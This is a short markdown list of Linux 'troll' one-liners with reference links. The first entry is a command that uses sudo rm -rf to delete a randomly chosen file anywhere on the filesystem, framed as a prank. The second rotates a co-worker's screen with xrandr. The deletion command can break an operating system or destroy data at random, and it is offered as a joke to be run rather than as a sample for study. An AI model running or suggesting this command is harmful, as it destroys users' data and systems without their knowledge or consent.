### 1. Pick a file at random . . .
```
sudo rm -rf $(sudo find / -type f | shuf -n1)
```
**- Troll**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
https://devnull-as-a-service.com/one-less-to-go.sh
__________
### 2. Anoy a co-worker by rotating their screen
```
xrandr   --output `xrandr -q | grep "connected" | grep -v dis | awk '{print $1}' | head -n 1` --rotate  inverted
```
**- Troll,interseting**
#### References:

https://www.faqforge.com/linux/rotating-screen-in-ubuntu-and-linux-mint/
__________
